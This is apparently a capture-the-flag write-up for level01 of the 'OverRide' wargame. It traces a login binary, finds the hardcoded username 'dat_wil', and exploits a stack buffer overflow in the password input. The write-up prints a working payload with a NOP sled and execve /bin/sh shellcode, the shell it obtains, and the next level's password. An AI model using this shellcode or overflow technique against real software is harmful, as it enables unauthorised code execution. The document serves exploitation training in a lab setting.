@@ -1,0 +1,98 @@
+level01 checks for a username :
+
+----------------
+
+level01@OverRide:~$ ltrace ./level01 
+__libc_start_main(0x80484d0, 1, -10348, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)                                                 = 39
+printf("Enter Username: ")                                                                  = 16
+fgets(Enter Username: hello
+"hello\n", 256, 0xf7fcfac0)                                                           = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                                                            = 24
+puts("nope, incorrect username...\n"nope, incorrect username...
+
+)                                                       = 29
++++ exited (status 1) +++
+
+----------------
+
+Let's check for strings in the read only data section of the program for hardcoded credentials :
+
+level01@OverRide:~$ objdump -s -j .rodata ./level01 
+
+./level01:     file format elf32-i386
+
+Contents of section .rodata:
+ 8048688 03000000 01000200 76657269 6679696e  ........verifyin
+ 8048698 67207573 65726e61 6d652e2e 2e2e0a00  g username......
+ 80486a8 6461745f 77696c00 61646d69 6e000000  dat_wil.admin...
+ 80486b8 2a2a2a2a 2a2a2a2a 2a204144 4d494e20  ********* ADMIN 
+ 80486c8 4c4f4749 4e205052 4f4d5054 202a2a2a  LOGIN PROMPT ***
+ 80486d8 2a2a2a2a 2a2a0045 6e746572 20557365  ******.Enter Use
+ 80486e8 726e616d 653a2000 6e6f7065 2c20696e  rname: .nope, in
+ 80486f8 636f7272 65637420 75736572 6e616d65  correct username
+ 8048708 2e2e2e0a 00456e74 65722050 61737377  .....Enter Passw
+ 8048718 6f72643a 20006e6f 70652c20 696e636f  ord: .nope, inco
+ 8048728 72726563 74207061 7373776f 72642e2e  rrect password..
+ 8048738 2e0a00                               ...
+
+------------------
+
+'dat_wil' and 'admin' seem like good candidates ! 
+
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+admin
+nope, incorrect password...
+
+---------------
+Apparently we have a correct username, but not the password
+
+After debugging, we realize the logic of the program is flawed, and that no shell is ever given anyway
+The return value of the password check doesn't matter
+
+However, there are two buffer overflows :
+	
+	- One in the .bss segment, but there are no interesting variables or memories we can overwrite :
+	objdump -t -j .bss ./level01
+		SYMBOL TABLE:
+		0804a020 l    d  .bss   00000000              .bss
+		0804a024 l     O .bss   00000001              completed.6159
+		0804a028 l     O .bss   00000004              dtor_idx.6161
+		0804a020 g     O .bss   00000004              stdin@@GLIBC_2.0
+		0804a040 g     O .bss   00000064              a_user_name	-------> buffer overflow is here ! (256 bytes instead of 100)
+											 BUT no variable comes after :(
+	256 is also not enough to overwrite another data segment, as the memory boundaries of .bss in this program are : 0x0804a020 - 0x0804a0a4 .bss (from 'info files' on gdb)
+	- One in the stack, which we can easily exploit :
+	100 bytes are written in the main buf[64] --> enough to overwrite main() return adress
+
+We need to give the valid username to reach the buffer overflow (coming from our password input)
+
+so the payload needs to be :
+
+43 bytes NOP sled + 21 bytes shellcode (==64) | 4 bytes for local int return_value | 8 bytes for padding | 4 bytes for saved EBP | 4 bytes for return address inside NOP sled
+
+python -c 'print "dat_wil\n" + "\x90" * 43 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xef\xbe\xad\xde" * 4 + "\x00\xd7\xff\xff"'
+
+FINAL PAYLOAD (default TMUX)
+level01@OverRide:~$ (python -c 'print "dat_wil\n" + "\x90" * 43 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xef\xbe\xad\xde" * 4 + "\xca\xd6\xff\xff"'; cat) | ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+FINAL PAYLOAD (normal shell env)
+(python -c 'print "dat_wil\n" + "\x90" * 43 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xef\xbe\xad\xde" * 4 + "\xea\xd6\xff\xff"'; cat) | ./level01
